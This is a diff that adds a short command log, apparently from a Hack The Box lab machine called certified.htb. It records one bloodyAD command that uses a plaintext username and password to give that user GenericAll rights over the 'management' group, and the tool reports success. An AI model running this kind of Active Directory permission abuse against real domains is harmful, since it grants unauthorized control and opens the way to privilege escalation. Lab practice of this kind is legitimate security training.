@@ -1,0 +1,8 @@
+### [2026-04-05 20:28:24] bloodyAD --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 add genericAll management judith.mader
+
+$ bloodyAD --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 add genericAll management judith.mader
+
+[+] judith.mader has now GenericAll on management
+
+# Exit code: 0
+# Duration: 2026-04-05 20:28:25
